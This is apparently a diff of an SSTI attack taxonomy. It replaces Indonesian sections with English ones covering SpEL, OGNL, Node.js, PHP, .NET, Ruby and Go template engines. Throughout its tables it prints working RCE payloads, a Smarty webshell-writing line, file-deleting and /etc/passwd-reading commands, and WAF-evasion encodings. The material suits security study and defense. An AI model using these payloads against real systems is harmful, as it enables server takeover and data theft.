+SpEL is a standalone expression language used in Spring Framework annotations, `@Value`, and explicit parser calls. Structurally similar to SSTI but operates outside traditional template engines.
 
-Pebble membatasi akses ke `getClass()` dan method berbahaya lainnya. Bypass memanfaatkan type system Java dan framework integration.
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`T()` type operator** | `${T(java.lang.Runtime).getRuntime().exec("id")}` — `T()` invokes static methods on named classes | Spring `SpelExpressionParser` evaluating user input |
+| **`SpelExpressionParser` eval sink** | Application directly calls `PARSER.parseExpression(userInput).getValue()` | Developer explicitly builds SpEL parser from user input |
+| **JSP `springJspExpressionSupport` double eval** | Spring's JSP tag evaluates `${...}` expressions; if JSP page includes user data, a second SpEL evaluation may occur | Spring Framework JSP + double evaluation enabled (pre-3.0.6 default) |
+| **HubSpot HubL EL injection** | HubSpot's template language processes `${...}` expressions server-side in user-configurable content | SaaS platform's user-accessible template editor lacks output encoding |
 
-| Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|---|
-| **Case-insensitive method bypass** | Pebble < 3.0.9 memeriksa `getClass` secara case-sensitive | Pebble < 3.0.9 | `{{ variable.GetClass().forName(...) }}` |
-| **Java wrapper TYPE field** | `java.lang.Integer.TYPE` (dan serupa) menyediakan object `Class` tanpa `getClass()` | Java wrapper type apa pun yang accessible | `{{ (1).TYPE }}` → `java.lang.Class` → reflection chain |
-| **Spring bean object graph** | Traverse exposed Spring bean untuk menemukan object dengan ClassLoader atau akses `exec()` | Spring integration dengan bean yang diekspos ke template | Deep inspection dari bean object graph untuk dangerous method |
-| **Module-based forName** | Signature `java.lang.Class.forName(java.lang.Module, java.lang.String)` melewati method restriction | Java 9+ module system | Overload `forName` alternatif tidak dicakup oleh denylist |
+### §4-4. OGNL Injection (Struts/Confluence)
 
-### §4-5. Jinja2 Sandbox Escape
+OGNL (Object-Graph Navigation Language) is used by Apache Struts 2 and Atlassian Confluence for expression evaluation. It is structurally an expression language injected into a Java object graph.
 
-`SandboxedEnvironment` dari Jinja2 membatasi attribute access dan method call. Escape mengandalkan mencapai object dari environment yang tidak di-sandbox.
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **Direct OGNL sink** | `%{7*7}` evaluated in an OGNL context → 49; escalated to `Runtime.exec()` | Struts 2 action passes user input to OGNL evaluator |
+| **Sandbox escape via `#attr` pivot** | Accessing `#attr['com.opensymphony.xwork2.ActionContext.actionInvocation'].invoke()` forces action result rendering, populating FreeMarker template model | OGNL sandbox prevents direct `Runtime` access but permits context traversal |
+| **Double OGNL via Velocity/FreeMarker tags** | Struts Velocity/FreeMarker tags re-evaluate expressions; a variable assignment in OGNL becomes a template variable evaluated again | Multi-layer Struts rendering pipeline (OGNL → template tag) |
+| **Authentication bypass chaining** | URL-encoded OGNL expression in path component (`/;%7B%27a%27%2B%27b%27%7D/`) bypasses URL filters, reaches OGNL evaluator | WAF/filter inspects pre-decode URL; OGNL evaluates post-decode URL |
 
-| Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|---|
-| **Explicitly passed objects** | Object yang di-pass ke `render_template()` mungkin memiliki unrestricted method access | Developer me-pass object dengan dangerous method | Abuse method dari application-specific object |
-| **`__globals__` via allowed objects** | Bahkan dalam sandbox, jika `__init__.__globals__` chain dari allowed object mencapai `os`, execution mungkin | Sandbox tidak memblokir traversal `__globals__` pada allowed object | `{{ allowed_obj.__init__.__globals__['os'].popen('id').read() }}` |
-| **Format string escape** | `format_map()` atau `format()` pada string object untuk mengakses globals | Sandbox mengizinkan string formatting | String format specifiers untuk leak atau access restricted object |
+**CVE references**: CVE-2023-22527 (Atlassian Confluence OGNL SSTI — CVSS 10.0, cryptojacking/ransomware exploitation in the wild 2024), CVE-2021-26084 (Confluence OGNL injection).
 
 ---
 
-## §5. Prototype & Compilation-Phase Pollution
+## §5. JavaScript/Node.js Template Engine Exploitation
 
-Dalam environment JavaScript (Node.js), template engine dapat dikompromikan bukan melalui direct template syntax injection tetapi dengan mencemari JavaScript object prototype atau template compilation pipeline itu sendiri.
+Node.js template engines (Handlebars, Pug, Nunjucks, EJS, DotJS, Eta) share the JavaScript runtime. The universal exploitation pathway uses `global.process.mainModule.require('child_process')` to reach OS execution from any position in the template.
 
-### §5-1. EJS Compilation Pollution
+### §5-1. Universal Node.js `process` Chain
 
-EJS mengkompilasi template menjadi JavaScript function. Prototype pollution dapat menyuntikkan code ke dalam compilation output.
+All Node.js-based engines that expose the global object can reach OS execution via the same chain, regardless of engine-specific syntax.
 
-| Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|---|
-| **`outputFunctionName` pollution** | Cemari `Object.prototype.outputFunctionName` dengan JS code; EJS menggabungkannya ke dalam compiled function | Server-side prototype pollution + EJS rendering | `{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').exec('id');//"}}` |
-| **`escapeFunction` pollution** | Cemari `opts.escapeFunction`; ketika `opts.client` truthy, EJS merefleksikannya unsanitized ke dalam compiled code | Prototype pollution + flag `client` | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify;process.mainModule.require('child_process').exec('id')"}}` |
-| **`destructuredLocals` pollution** | Cemari array-like properties untuk menyuntikkan destructuring pattern ke dalam compiled output | Versi EJS dengan dukungan destructured locals | Inject malicious variable names dalam destructuring |
-| **`settings.view options` chain** | Express menyediakan default config yang mengalir ke option EJS, menciptakan pollution path | Express + EJS default configuration | Default settings Express membuat aplikasi "vulnerable by default" |
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`process.mainModule.require`** | `global.process.mainModule.require("child_process").execSync("id").toString()` | Engine does not restrict `global` access; expression evaluation enabled |
+| **`constructor` method abuse** | Nunjucks: `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}` | `constructor` property accessible; engine evaluates `Function` constructor |
+| **`this` chain** | `{{this.constructor.constructor('return process')().mainModule.require('child_process').exec('id')}}` | `this` keyword available in render scope |
 
-### §5-2. Other Node.js Engine Pollution
+### §5-2. Pug-Specific Exploitation
 
-| Subtype | Engine | Mekanisme | Contoh |
-|---|---|---|---|
-| **Pug options pollution** | Pug | Cemari compiler options untuk menyuntikkan code selama template compilation | `{"__proto__":{"block":{"type":"Text","val":"...child_process..."}}}` |
-| **Handlebars helper pollution** | Handlebars | Cemari prototype untuk register malicious helper atau modifikasi compilation | Abuse `__lookupGetter__` dan `__defineGetter__` |
-| **`constructor.constructor` chain** | Multiple engine | Bahkan tanpa direct pollution, `constructor.constructor` mencapai `Function` untuk eval | `{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}` |
+Pug (formerly Jade) uses a distinct whitespace-sensitive syntax that allows multiline JavaScript execution.
 
----
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **Unescaped code block** | `- var x = root.process` followed by execution chain | Template rendering a user-supplied Pug template string |
+| **`#{}` inline expression** | `#{root.process.mainModule.require('child_process').spawnSync('cat',['/etc/passwd']).stdout}` | Inline expression context in Pug template |
+| **`!{...}` unescaped output** | `!{Buffer.from('...base64...','base64').toString()}` to decode and render payloads | HTML escaping applied to `#{}`; `!{}` bypasses it |
 
-## §6. Preprocessing & Double Evaluation
+### §5-3. EJS Injection
 
-Beberapa template engine mengimplementasikan multi-phase template processing di mana expression dievaluasi dalam stage. Injecting ke dalam earlier processing phase dapat melewati defense yang diterapkan pada later phase.
+EJS (Embedded JavaScript) uses `<% %>` tags that execute raw JavaScript with no sandboxing.
 
-### §6-1. Thymeleaf Preprocessing Injection
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`<% ... %>` raw execution** | `<% require('child_process').exec('id') %>` | Application passes user input as EJS template source |
+| **`options.outputFunctionName` prototype pollution** | EJS option `outputFunctionName` can be set to a function name; if prototype pollution is exploitable, the function name becomes `__proto__.eof` | Prototype pollution vector + EJS `renderFile` usage |
 
-Preprocessing expression Thymeleaf mengevaluasi content antara marker `__...__` sebelum main expression evaluation pass.
+### §5-4. Handlebars Exploitation
 
-| Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|---|
-| **URL parameter preprocessing** | Input pengguna dalam expression URL `@{...}` dengan preprocessing `__${input}__` | Input direfleksikan dalam atribut URL `th:href` atau serupa | `__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x` |
-| **Fragment expression preprocessing** | Input digunakan dalam fragment selector `~{template :: __${input}__}` | Dynamic fragment resolution | Inject expression yang dievaluasi selama preprocessing |
-| **Attribute preprocessing** | Input dalam `th:text`, `th:value`, atau atribut lain dengan preprocessing | Double-underscore marker dalam nilai atribut template | `__${expression}__` dievaluasi sebelum outer expression |
+Handlebars restricts JavaScript access by design, but `{{#with}}` block helpers and prototype chain access provide bypass paths.
 
-### §6-2. Multi-Pass Template Rendering
-
-| Subtype | Engine | Mekanisme | Contoh |
-|---|---|---|---|
-| **Twig double render** | Twig | Template output di-proses ulang melalui Twig (misalnya, CMS me-render user content sebagai template) | First pass menyisipkan payload, second pass mengeksekusi |
-| **Jinja2 `from_string`** | Jinja2 | Aplikasi menggunakan `Environment.from_string()` pada input pengguna, menciptakan direct template execution | `from_string()` memperlakukan input sebagai template source code |
-| **FreeMarker `?interpret`** | FreeMarker | `?interpret` mengevaluasi string sebagai FreeMarker template saat runtime | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` dalam interpreted string |
-| **Recursive include/import** | Multiple | Template include template lain yang mengandung user-controlled content | Included template mewarisi full template context |
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`#with` block + `constructor` escape** | `{{#with "constructor"}}{{#with split as |a|}}{{#with (a.join (lookup . "constructor"))}}` chain to reach `Function` | Handlebars without `allowProtoProperties` enabled |
+| **Unsafe `eval()` wrapper** | If application passes Handlebars output to `eval()` or similar — combined SSTI → code injection | Post-render evaluation in application logic |
 
 ---
 
-## §7. Detection & Identification Techniques
+## §6. PHP Template Engine Exploitation
 
-Identifikasi template engine adalah prasyarat kritis untuk eksploitasi. Engine yang berbeda merespons berbeda terhadap polyglot probe yang sama.
+PHP engines (Twig, Smarty, Blade) operate within the PHP runtime. Exploitation pathways differ substantially from Python/Java due to PHP's function-level execution model.
 
-### §7-1. Polyglot-Based Detection
+### §6-1. Twig Exploitation
 
-| Subtype | Mekanisme | Contoh Probe |
-|---|---|---|---|
-| **Universal error polyglot** | Single string yang memicu error dalam semua 44 template engine major | `<%'${{/#{@}}%>{{` (16 karakter) |
-| **Arithmetic evaluation probe** | Expression matematika yang me-render hasil dalam engine yang rentan | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}` |
-| **String multiplication probe** | Distinguish engine berdasarkan bagaimana mereka menangani string multiplication | `{{7*'7'}}` → Jinja2: `7777777`, Twig: `49` |
-| **Non-error polyglots** | Tiga probe yang secara kolektif me-render modified (bukan error) output untuk semua 44 engine | Polyglot dari penelitian Template Injection Table |
-| **Error message fingerprinting** | Memicu error message spesifik engine untuk mengidentifikasi engine | Sintaks invalid yang menargetkan parser setiap engine |
+Twig's sandbox is more restrictive than Jinja2's and disables most dangerous functions by default. Exploitation requires indirect object access or version-specific features.
 
-### §7-2. Behavioral Fingerprinting
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`_self.env` filter chain** | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` — registers PHP `exec` as a filter | Twig without sandbox; `_self` exposes the Environment object |
+| **`filter` abuse** | `{{['id']|map('passthru')}}` or `{{'/etc/passwd'|file_get_contents}}` | Filter functions not restricted; user controls filter argument |
+| **Twig sandbox bypass via `getattr`** | `{{attribute(object, '__toString')}}` to call methods not normally accessible | Sandbox allows `attribute()` but not direct method calls |
+| **Quote-free RCE** | Using `lower` filter and integer-to-char conversion to build string payloads without quote characters | Quote-filtering in WAF; Twig lacks Python's `chr()` but string manipulation via concatenation still possible |
 
-| Subtype | Mekanisme | Sinyal Pembeda |
-|---|---|---|---|
-| **Delimiter-based identification** | Test style delimiter yang berbeda: `{{ }}`, `<% %>`, `${ }`, `#{ }`, `{% %}` | Delimiter mana yang menyebabkan evaluation vs. literal output |
-| **Built-in object probing** | Probe untuk object spesifik engine: `self`, `_self`, `this`, `request`, `env` | Eksistensi object mengkonfirmasi engine spesifik |
-| **Filter/function availability** | Test engine-specific filter: `\|attr`, `?api`, `\|sort`, `\|map` | Eksistensi filter mempersempit identitas engine |
-| **Comment syntax testing** | Test comment delimiter: `{# #}`, `<%-- --%>`, `{{!-- --}}` | Perilaku rendering comment |
-| **DNS/time-based blind detection** | Gunakan `sleep()`, DNS lookup, atau HTTP callback untuk blind SSTI | Sinyal out-of-band mengkonfirmasi template evaluation |
-| **Error-based reflection exfiltration** | Sengaja memicu runtime error yang error message atau stack trace-nya menggabungkan target data — misalnya, memaksa type error dengan menggabungkan secret data dengan tipe yang tidak kompatibel (`{{ secret_var + [] }}`), atau menyebabkan NameError/UndefinedError di mana nama variable itu sendiri membawa content yang di-exfiltrate. Error message yang direfleksikan dalam HTTP response membawa data yang diekstrak tanpa memerlukan channel out-of-band | Template engine mengembalikan verbose error message ke client atau menulisnya ke log yang accessible; expression evaluation dalam error context (penelitian "Blind SSTI" vladko312, 2025) |
+**CVE reference**: Ekoparty 2024 research demonstrating quote-free Twig RCE without external parameters.
 
----
+### §6-2. Smarty Exploitation
 
-## §8. Filter & WAF Bypass Techniques (Detailed)
+Smarty exposes PHP directly via `{php}` tags in older versions (v2/v3) and retains dangerous write-file built-ins in all versions.
 
-Bagian ini memperluas tipe Axis 2 cross-cutting bypass dengan teknik konkret yang diorganisir berdasarkan tipe restriction.
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`{php}` tag execution** | `{php}echo system('id');{/php}` — executes raw PHP | Smarty v2 or v3 with `{php}` not disabled |
+| **`Smarty_Internal_Write_File::writeFile`** | `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}` — writes a webshell to the document root | Smarty v3/v4; static method accessible via template; web root writable |
+| **`{system()}`** | `{system('ls')}` — PHP function called directly as Smarty function | Smarty configured to allow PHP function calls; deprecated config |
 
-### §8-1. Character Restriction Bypass
+### §6-3. Blade Exploitation (Laravel)
 
-Ketika karakter spesifik difilter (underscore, dot, bracket, quote, dll.), fitur template engine itu sendiri menyediakan alternative access path.
+Laravel's Blade engine is restrictive but supports raw PHP via `{!! !!}` and `@php` directives.
 
-| Karakter yang Dibatasi | Teknik Bypass | Engine | Contoh |
-|---|---|---|---|
-| `_` (underscore) | Hex encoding `\x5f` | Jinja2 | `request\|attr('\x5f\x5fclass\x5f\x5f')` |
-| `_` (underscore) | Parameter smuggling `request.args` | Jinja2 (Flask) | `request\|attr(request.args.x)` dengan `?x=__class__` |
-| `.` (dot) | Bracket notation `[]` | Jinja2 | `request['__class__']` |
-| `.` (dot) | Filter `\|attr()` | Jinja2 | `request\|attr('__class__')` |
-| `[]` (brackets) | Filter `\|attr()` | Jinja2 | `request\|attr('__class__')` |
-| `'` dan `"` (quotes) | Komposisi function `chr()` | Smarty | `{chr(105)\|cat:chr(100)}` → `"id"` |
-| `'` dan `"` (quotes) | `request.args` | Jinja2 (Flask) | Nilai dari query string tidak memerlukan quote dalam template |
-| `'` dan `"` (quotes) | `?lower_abc` number-to-char | FreeMarker | `6?lower_abc` → `"f"` |
-| `{{ }}` (delimiters) | Sintaks block `{% %}` | Jinja2 | `{% if condition %}...{% endif %}` untuk blind injection |
-| `{{ }}` (delimiters) | Block `{% with %}` | Jinja2 | `{% with a=request['application']['__globals__'] %}{{ a }}{% endwith %}` |
-| Keywords (`os`, `system`) | String concatenation | Jinja2 | `['o','s']\|join` atau `request.args` smuggling |
-| Keywords | Character building `?lower_abc` | FreeMarker | Build keyword character demi character |
-| `__class__` dll. | Filter `\|join` concatenation | Jinja2 | `request\|attr(["__","class","__"]\|join)` |
-| Karakter umum | Konstruksi list `getlist()` | Jinja2 (Flask) | `request.args.getlist('x')` untuk membangun list tanpa `[]` |
-| Karakter umum | Decoding `query_string` | Jinja2 (Flask) | `request.query_string[2:16].decode()` |
-
-### §8-2. Payload Obfuscation Techniques
-
-| Teknik | Tujuan | Engine/Context | Contoh |
-|---|---|---|---|
-| **Base64 encoding** | Menghindari WAF rule berbasis signature | Multiple (terutama Java engine) | Nested base64 encoding dari komponen payload |
-| **Character concatenation** | Bypass keyword filter | Java engine (Velocity) | `Character.toString(99).concat(Character.toString(97))...` → `"cat"` |
-| **ASCII value construction** | Bypass string literal filter | Smarty, FreeMarker | `chr()` / `?lower_abc` character-by-character |
-| **Unicode normalization** | Menghindari character-level filter | Multiple | Unicode equivalent dari karakter yang dibatasi |
-| **Whitespace manipulation** | Memecah WAF regex pattern | Multiple | Tab, newline, zero-width space antar token |
-| **Comment injection** | Memecah keyword signature | Twig, Smarty | `{# comment #}` antara bagian dari sensitive keyword |
-| **Variable indirection** | Menghindari sensitive string dalam payload | Jinja2, Twig | Simpan bagian payload dalam variable via `{% set %}` |
-
-### §8-3. Context-Aware Delivery Techniques
-
-| Teknik | Mekanisme | Contoh |
-|---|---|---|---|
-| **HTTP header smuggling** | Deliver bagian payload via HTTP header, akses via `request.headers` | `request\|attr(request.headers.x)` dengan header `X: __class__` |
-| **Cookie-based delivery** | Simpan komponen payload dalam cookie, akses via `request.cookies` | `request\|attr(request.cookies.x)` |
-| **Multi-parameter split** | Pecah payload di seluruh multiple GET/POST parameter, reassemble dalam template | Setiap `request.args.paramN` membawa fragment |
-| **Content-Type confusion** | Gunakan Content-Type yang tidak terduga untuk melewati WAF body parsing | JSON body dengan template syntax ketika WAF mengharapkan form data |
-| **Path-based injection** | Inject via URL path segment, akses via `request.path` | Template injection dalam routing parameter |
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`@php` directive** | `@php system('id'); @endphp` | Application renders user-supplied Blade templates server-side |
+| **`{!! !!}` unescaped echo** | `{!! system('id') !!}` | Application passes user content through `{!! !!}` instead of `{{ }}` |
 
 ---
 
-## Attack Scenario Mapping (Sumbu 3)
+## §7. .NET / C# Template Engine Exploitation
 
-| Skenario | Arsitektur | Kategori Mutasi Utama | Dampak |
-|---|---|---|---|
-| **Unsandboxed RCE** | Template engine tanpa pembatasan, input pengguna dalam template source | §1 (Direct Execution) | Full system compromise |
-| **Sandboxed RCE** | Template engine dengan sandbox, memerlukan escape chain | §4 (Sandbox Escape) + §2 (Introspection) | Full system compromise |
-| **CMS Template Editing** | CMS mengizinkan user mengedit template (Grav, Craft, WordPress) | §3 (Built-in Abuse) + §4 (Sandbox Escape) | Site takeover, lateral movement |
-| **Filtered/WAF-Protected** | Input filter atau WAF memblokir payload umum | §8 (Bypass Techniques) + §2/§3 | RCE jika bypass berhasil |
-| **Prototype Pollution → SSTI** | Kerentanan SSPP berantai ke template engine | §5 (Compilation Pollution) | RCE via indirect template compromise |
-| **Blind SSTI** | Tidak ada output reflection; memerlukan out-of-band exfiltration | §7-2 (Blind Detection) + any §2-§4 | Data exfiltration, RCE via callback |
-| **SSRF via Template** | Template engine fetch remote resource atau akses internal API | §4-1 (FreeMarker `getResourceAsStream`), §1-3 | Internal service access, cloud metadata |
-| **File Read/Write** | Template menyediakan file I/O primitive atau traversal | §1-3, §4-1 (ClassLoader resource) | Source code disclosure, webshell creation |
-| **Client-Side Template Injection (CSTI)** | Client-side framework memproses input pengguna sebagai template dalam browser | AngularJS `{{constructor...}}`, Vue.js `constructor` | XSS, DOM manipulation (bukan RCE) |
+The .NET ecosystem surfaces SSTI through Razor (ASP.NET Core), RazorEngine (third-party), and Scriban.
+
+### §7-1. Razor / RazorEngine Injection
+
+Razor uses `@` as its expression delimiter and compiles C# code server-side.
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`@()` expression evaluation** | `@(2+2)` → `4`; escalated to `@(System.Diagnostics.Process.Start("cmd","/c id"))` | `Razor.Parse(userInput)` or `Engine.Razor.RunCompile(userInput,...)` in application code |
+| **`@{...}` code block** | `@{ var x = System.IO.File.ReadAllText("/etc/passwd"); @x }` — multiline C# block | RazorEngine without template source restrictions |
+| **`System.Diagnostics.Process.Start` webshell** | C# code adds a webshell file to the server, then requests it via HTTP | Write permissions on web root; Razor evaluation confirmed |
+
+**Example** (Razor SSTI — confirmed via `@(7*7)`):
+```
+POST /render HTTP/1.1
+razorTpl=@{var p=new System.Diagnostics.Process();p.StartInfo.FileName="id";p.Start();}
+→ Command executed server-side via compiled C#
+```
+
+### §7-2. CrushFTP VFS Sandbox Escape
+
+CVE-2024-4040 illustrates SSTI exploited in a non-web-framework context. CrushFTP's virtual filesystem uses a template engine that allowed sandbox escape and file reads outside the VFS boundary.
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **VFS sandbox escape via template** | Template expression in a filename or path parameter evaluated by CrushFTP's engine; sandbox boundary not enforced | CrushFTP before 10.7.1 / 11.1.0; authentication not required |
+| **Authentication bypass chaining** | SSTI payload reads admin credential files outside VFS, enabling privilege escalation to administrator | File read payload → credential disclosure → auth bypass → RCE |
+
+**CVE reference**: CVE-2024-4040 — CrushFTP SSTI, exploited in the wild; CVSS Critical.
+
+---
+
+## §8. Ruby Template Engine Exploitation
+
+Ruby engines (ERB, Slim, Haml) execute Ruby code within template delimiters.
+
+### §8-1. ERB (Embedded Ruby) Exploitation
+
+ERB uses `<%= ... %>` for expression output and `<% ... %>` for code execution with no sandboxing.
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`<%= ... %>` expression output** | `<%= 7*7 %>` → `49`; escalated to `<%= system("id") %>` | Application uses `ERB.new(userInput).result()` |
+| **`<% ... %>` code execution** | `<% require 'open3'; Open3.popen3("id") {|i,o| puts o.read} %>` | ERB execution without output escaping |
+| **`system()` / `%x{...}` shell** | `<%= %x{id} %>` or `<%= `id` %>` — backtick shell execution | ERB template evaluated in Ruby runtime |
+
+**Example** (PortSwigger Lab pattern):
+```
+GET /template?name=<%= system("rm /home/carlos/morale.txt") %>
+→ Command executed; server returns nil (output suppressed but command runs)
+```
+
+### §8-2. Slim / Haml Exploitation
+
+Slim and Haml support Ruby evaluation with different delimiter conventions.
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **Slim `#{ ... }` interpolation** | `#{ 7*7 }` → `49`; `#{ system('id') }` executes shell | User-supplied Slim template processed by renderer |
+| **Haml `=` operator** | `= system('id')` on its own line evaluates Ruby expression | Haml template processing user-controlled input |
+
+---
+
+## §9. Go Template Engine Exploitation
+
+Go's `text/template` and `html/template` standard packages behave differently. `text/template` has no output encoding; `html/template` escapes HTML contexts but can still be exploited via method calls on injected objects.
+
+### §9-1. Method Call on Context Object
+
+Go templates cannot call arbitrary functions but *can* invoke methods on objects passed as template data. If the data object exposes dangerous methods, those become directly callable.
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **Direct method invocation** | `{{ .ExecuteCmd "id" }}` — calls a method on the data struct that executes OS commands | Application passes a struct with exec-capable methods to template; struct methods are public (uppercase) |
+| **Password field disclosure** | `{{ .Password }}` — renders an unexported struct field if accessed via a pointer receiver | Application passes user/admin struct with sensitive fields to template render |
+| **`{{ . }}` full struct dump** | Renders the entire data struct as a string, revealing all fields | Template data struct passed without field-level filtering |
+
+### §9-2. `text/template` vs. `html/template` Differential
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **XSS via `text/template`** | `{{"<script>alert(1)</script>"}}` renders raw HTML | Application uses `text/template` instead of `html/template` |
+| **Template definition injection** | `{{define "T1"}}alert(1){{end}} {{template "T1"}}` — bypasses `html/template` encoding in named template definitions | `html/template` used but user controls template *definition* strings, not just variable values |
+| **Custom `unsafeHTML` function** | Developer registers `unsafeHTML` as a template function; user-supplied value passed through it | Explicit opt-out of Go's auto-escaping via custom function |
+
+**Note**: Golang SSTI is significantly underreported because existing fuzzers and WAF signatures target Jinja2/FreeMarker syntax patterns. Go's `{{ }}` syntax overlaps with Jinja2 but the exploitation pathway is structurally distinct — requiring application-specific method calls rather than language-level runtime traversal.
+
+---
+
+## §10. Injection Delivery Surface Mutations (Non-Parameter Vectors)
+
+SSTI is commonly associated with GET/POST parameters, but the injection surface extends to any point where user-controlled data reaches a template render call.
+
+### §10-1. Second-Order (Stored) Injection
+
+User input is stored in a database or persistent store, then rendered by a template engine at a later point — often in an administrative view, email, PDF, or webhook retry context.
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **Profile field injection** | Malicious payload in `username`, `bio`, `company` field stored; rendered in admin panel or notification email | Admin/report view renders user profile data through template engine |
+| **Email template injection** | Payload stored in user-controlled email subject/body field; triggered when application generates transactional emails | Email rendering uses template engine; user field concatenated into template |
+| **PDF/report generation sink** | Payload stored; rendered when generating a PDF report or export using a templating library | PDF generation library (WeasyPrint, Puppeteer, JasperReports) processes template with unsanitized data |
+| **Webhook retry exploitation** | Payload stored; webhook delivery retries render the stored value through a template | Asynchronous job queue renders stored template data without re-sanitizing |
+| **Stored SSTI via content field** | CMS page content or wiki body contains template syntax; rendered when admin previews or publishes | CMS uses template engine for page rendering; user-submitted content not escaped |
+
+**CVE reference**: Apache OFBiz CVE-2022-25813 — SSTI triggered via stored `Subject` field in ecommerce plugin's "Contact us" page; required party manager to list communications to activate.
+
+### §10-2. HTTP Header and Request Metadata Injection
+
+Template engines that reflect HTTP request metadata (headers, method, path) create injection surfaces outside traditional input parameters.
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **Referer header injection** | HTTP `Referer` value reflected into a template without sanitization | Framework places request headers into template context automatically |
+| **User-Agent injection** | `User-Agent: {{7*7}}` reflected in an admin log view rendered by a template engine | Logging/analytics feature renders raw HTTP headers |
+| **X-Forwarded-For / custom header** | `X-Forwarded-For: {{config.SECRET_KEY}}` reflected in error pages or request traces | Error page template renders request headers for debugging |
+| **URL path / query string injection** | Application constructs template from URL path segments: `/hello/{{7*7}}` renders expression | Routing framework passes path segments directly into template render |
+| **Cookie injection** | Session or tracking cookie value reflected into a template | Cookie value used as template variable without sanitization |
+
+### §10-3. Indirect / Code-Context Injection Paths
+
+The vulnerability resides one level of abstraction away — the user controls data that flows into a template helper, layout renderer, or partial, rather than into the top-level template string.
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **Template include parameter** | `?template=../../evil_template` — user controls template filename; path traversal selects attacker-controlled file | Application uses `render(user_specified_template)` with insufficient path validation |
+| **Partial/layout injection** | User-controlled content passed to `render(body)` inside a layout; layout renders it as a template partial | Layout engine evaluates the `body` variable as raw template code |
+| **i18n string injection** | Internationalization string stored per-user and rendered via template engine for localized output | Localization system uses template rendering to process translation strings |
+| **Email template customization** | SaaS feature allowing users to customize email notification templates; template content stored and later rendered | Platform exposes template editor with insufficient sandboxing |
+
+---
+
+## §11. Sandbox Escape and Filter Bypass Mutations
+
+Defensive measures (sandboxes, character blacklists, WAF rules) are the primary obstacles to exploitation. This category maps techniques used to overcome them, independent of the underlying engine.
+
+### §11-1. Character and Attribute Encoding Bypasses
+
+Input filters that block specific characters (`.`, `_`, `[`, `]`, quotes) can be circumvented via encoding schemes supported natively by the template engine's string handling.
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **Python hex literal encoding** | `'\x5f\x5f'` instead of `'__'` in string literals | WAF blocks literal `__`; hex escapes evaluated natively by Python |
+| **`|attr()` filter accessor** | `request\|attr('__class__')` instead of `request.__class__` | WAF blocks `.` character; Jinja2's `|attr()` filter bypasses it |
+| **`[]` bracket accessor** | `request['__class__']` instead of `request.__class__` | Both `.` and `|attr()` blocked; bracket notation still valid |
+| **`request.args` parameter smuggling** | `{%with a=request|attr(request.args.f|format(request.args.a,...))%}` — keyword passed as URL param outside the filtered payload | Full `__class__` string blocked in template body; reconstructed from URL parameters |
+| **Full hex encoding** | Entire attribute string encoded: `request['\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e']` | WAF inspects literal strings; hex encoding evaluated at Python runtime |
+
+**Example** (Jinja2 — blocking `.`, `_`, `[]`, `|join`):
+```jinja
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')
+          |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
+          |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')
+          |attr('popen')('id')|attr('read')()}}
+```
+
+### §11-2. Quote-Free Payload Construction
+
+Many WAFs block single and double quotes. Alternative string-building methods reconstruct arbitrary strings from integer arithmetic or engine-native functions.
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **Python `chr()` function** | `chr(111)+chr(115)` → `'os'`; combined to build module/function names | Jinja2 with quotes blocked; `chr()` available in Python builtins |
+| **FreeMarker `lower_abc` function** | Converts integers to alphabetic characters; build strings char-by-char | FreeMarker with quote filtering; `lower_abc` is a built-in |
+| **Twig string manipulation** | `'a'~'b'` concatenation, `'abc'|slice(0,2)` substring extraction | Twig with partial quote restriction; some engines allow single not double quotes |
+| **Integer-to-char arithmetic** | Using arithmetic expressions to derive character code points, then native conversion | Universal; specific implementation varies by engine |
+
+### §11-3. Jinja2 Sandboxed Environment Bypass
+
+Jinja2's `SandboxedEnvironment` is the standard mitigation for SSTI. Several bypass vectors remain viable depending on how the sandbox is configured.
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`is_safe_attribute` override gap** | Custom `is_safe_attribute` whitelist misses critical dunder methods | Developer attempts custom sandbox but leaves gaps |
